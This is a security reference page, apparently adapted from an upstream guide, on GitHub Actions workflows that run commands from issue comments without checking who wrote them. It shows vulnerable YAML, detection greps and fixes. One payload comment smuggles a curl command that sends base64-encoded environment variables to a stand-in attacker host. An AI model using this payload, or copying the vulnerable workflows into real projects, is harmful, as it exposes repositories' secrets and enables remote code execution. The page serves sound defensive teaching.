> AAS import adaptation (2026-10-14): `UNTRUSTED_REMOTE_EXECUTION` is a non-operational marker for downloading an untrusted payload and executing it in a shell. Attack flows remain illustrative; original delivery strings are available in the pinned upstream source recorded in `UPSTREAM-NOTICE.md`.

# Comment-Triggered Command Execution

## Overview

Workflows triggered by `issue_comment` that parse commands from comment bodies (e.g., `/deploy`, `/version`, `/approve`) can be exploited if they lack authorization checks. Any GitHub user can comment on public repository issues/PRs, making unprotected command handlers a direct RCE vector.

---

## The Vulnerability

```yaml
# VULNERABLE: No author check — any GitHub user can trigger
on:
  issue_comment:
    types: [created]

jobs:
  deploy:
    if: contains(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
```

Any GitHub user can comment `/deploy` on any issue or PR, and the workflow will execute.

---

## Attack Vectors

### Unauthorized Command Execution

The simplest attack: trigger a privileged operation without authorization.

```yaml
# VULNERABLE: Any commenter can trigger version bump
on: issue_comment
jobs:
  version:
    if: |
      github.event.issue.pull_request &&
      contains(github.event.comment.body, '/version')
    steps:
      - uses: actions/checkout@v4
        with:
          ref: refs/pull/${{ github.event.issue.number }}/head  # issue_comment has no pull_request object; still untrusted PR code
      - run: ./version.sh -u -n
```

**Real-world:** Used against project-akri (CNCF project). The attacker modified `version.sh` in their fork PR to inject `UNTRUSTED_REMOTE_EXECUTION` at the top, then commented `/version minor` to trigger execution. No `author_association` check existed.

### Compound: Command + Expression Injection

When the comment body is both the trigger AND used in a `run:` block:

```yaml
# VULNERABLE: Double risk — no auth + expression injection
on: issue_comment
jobs:
  greet:
    if: startsWith(github.event.comment.body, '/greet')
    steps:
      - run: echo "Greeting from: ${{ github.event.comment.body }}"
```

**Payload comment:**
```
/greet"; curl https://attacker.com/$(env | base64) #
```

### Command with Fork Checkout

```yaml
# VULNERABLE: Comment triggers checkout of fork code
on: issue_comment
jobs:
  test:
    if: |
      github.event.issue.pull_request &&
      contains(github.event.comment.body, '/test')
    steps:
      - uses: actions/checkout@v4
        with:
          ref: refs/pull/${{ github.event.issue.number }}/merge
      - run: npm test  # Runs fork's test suite
```

This combines the `issue_comment` authorization problem with a pwn request — the comment triggers execution of untrusted fork code.

---

## Detection Patterns

```bash
# Find issue_comment workflows
grep -rn "issue_comment" .github/workflows/

# Check for command patterns in conditions
grep -A10 "issue_comment" .github/workflows/*.yml | grep "contains\|startsWith"

# Check if author_association is validated
grep -A20 "issue_comment" .github/workflows/*.yml | grep "author_association"

# Check if comment body is used in run blocks
grep -A30 "issue_comment" .github/workflows/*.yml | grep "comment\.body"
```

---

## The Fix: Explicit Authorization

`author_association` is a coarse relationship label, not a current write/maintain permission check. Resolve the triggering actor's effective permission with a trusted API or explicit allowlist, bind approval to the exact PR head SHA, and parse the whole command. Membership alone does not authorize production deployment.

```yaml
# SAFE: Only org members can trigger commands
on:
  issue_comment:
    types: [created]

jobs:
  deploy:
    if: |
      contains(github.event.comment.body, '/deploy') &&
      (
        github.event.comment.author_association == 'MEMBER' ||
        github.event.comment.author_association == 'OWNER' ||
        github.event.comment.author_association == 'COLLABORATOR'
      )
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: ./deploy.sh
```

### Author Association Values

| Value | Meaning | Trust Level |
|-------|---------|-------------|
| `OWNER` | Repository owner | Trusted |
| `MEMBER` | Organization member | Trusted |
| `COLLABORATOR` | Invited collaborator | Trusted |
| `CONTRIBUTOR` | Has merged PR | Partially trusted |
| `FIRST_TIMER` | First PR ever | Untrusted |
| `FIRST_TIME_CONTRIBUTOR` | First PR to this repo | Untrusted |
| `NONE` | No association | Untrusted |

Use association only as a preliminary filter; verify effective permission and environment protection before privileged operations.

### Additional Protections

```yaml
# SAFER: Author check + no expression injection + approval team
jobs:
  deploy:
    if: |
      contains(github.event.comment.body, '/deploy') &&
      github.event.comment.author_association == 'MEMBER'
    steps:
      - uses: actions/checkout@v4
      # Use env var for any comment data, not ${{ }} in run:
      - env:
          COMMENT_BODY: ${{ github.event.comment.body }}
        run: |
          # Parse command arguments safely
          ARGS=$(echo "$COMMENT_BODY" | grep -oP '(?<=/deploy\s).*' | head -1)
          # Validate arguments against allowlist
          if [[ "$ARGS" =~ ^(staging|production)$ ]]; then
            ./deploy.sh "$ARGS"
          else
            echo "Invalid deploy target: $ARGS"
            exit 1
          fi
```

---

## Exploitation Scenario Template

```
ATTACK: Unauthorized Command via issue_comment
ENTRY: Attacker comments on a public issue/PR
PAYLOAD: Comment body containing "/[command]" [+ optional injection]
TRIGGER: issue_comment workflow at [file:line], condition at line [N]
  matches without checking author_association
EXECUTION: [What runs — script execution, fork checkout, etc.]
IMPACT: [RCE, deployment trigger, secret access, etc.]
```

---

## References

- [GitHub Docs: Events that trigger workflows — issue_comment](https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#issue_comment)
- [HackerBot Claw — project-akri /version command exploit](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
